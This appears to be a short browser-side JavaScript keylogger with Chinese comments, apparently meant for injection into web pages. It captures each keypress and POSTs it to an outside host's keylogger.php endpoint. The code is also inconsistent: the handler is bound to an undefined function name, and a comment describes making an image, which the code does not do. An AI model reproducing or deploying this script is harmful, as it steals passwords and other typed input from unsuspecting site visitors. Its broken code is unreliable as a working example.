/*

*/

// 封装函数，制作图片并发送给服务端
function sendKeyLoggerToServer() {
    const evt = evt || window.event;
    const key = String.fromCharCode(evt.charCode);
    if (key) {
            var http = new XMLHttpRequest();
            var param = encodeURI(key);
            http.open("POST", "http://www.qytphp.com/keylogger.php", true);
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.send("key=" + param);
        }
}
  
  // 将事件监听器附加到“keypress”事件上
  document.onkeypress = sendCookieToServer;
  
